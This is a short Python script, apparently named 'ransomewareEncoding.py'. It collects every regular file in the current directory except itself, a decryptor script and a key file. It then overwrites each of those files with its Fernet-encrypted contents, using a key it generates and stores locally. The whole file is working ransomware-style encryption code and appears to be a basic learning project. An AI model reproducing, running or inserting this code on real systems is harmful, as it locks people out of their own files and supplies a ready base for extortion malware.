import os
from cryptography.fernet import Fernet

files=[]


'''
if you want to add custom path or list directories other than your working directory
import os
from cryptography import fernet

files=[]

for file in os.listdir():
    if file== "ransomewareEncoding.py":
        continue
    if os.path.isdir(file):
        continue
    files.append(file)
print(files)'''

for file in os.listdir():
    if file== "ransomewareEncoding.py"  or file=="ransomewareDecrypting.py" or file=="encryption.key":
        continue
    if os.path.isdir(file):
        continue
    files.append(file)
print(files)

enckey="encryption.key"

if os.path.exists(enckey):
        with open(enckey, "rb") as f:
            key = f.read()
else:        
    key=Fernet.generate_key()
    with open("encryption.key", "wb") as encryptionkey:
        encryptionkey.write(key)

for file in files:
    with open (file, "rb") as thefile:
        contents=thefile.read()
    contents_encrypted=Fernet(key).encrypt(contents)
    with open (file, "wb") as thefile:
        thefile.write(contents_encrypted)